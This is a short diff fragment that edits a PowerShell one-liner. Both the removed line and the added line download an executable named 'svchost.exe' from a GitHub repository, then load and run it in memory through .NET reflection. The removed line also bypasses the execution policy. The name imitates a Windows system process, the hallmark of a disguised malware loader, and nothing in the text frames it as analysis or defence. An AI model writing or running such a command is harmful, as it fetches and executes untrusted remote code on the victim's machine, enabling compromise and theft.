@@ -1,4 +1,5 @@
-powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -Command "[System.Reflection.Assembly]::Load((Invoke-WebRequest 'https://github.com/mathsencud-creator/rs/raw/main/svchost.exe').Content).EntryPoint.Invoke($null, $null)"
+[System.Reflection.Assembly]::Load((Invoke-WebRequest 'https://github.com/mathsencud-creator/rs/raw/main/svchost.exe').Content).EntryPoint.Invoke($null, $null)"
+
 
 
 
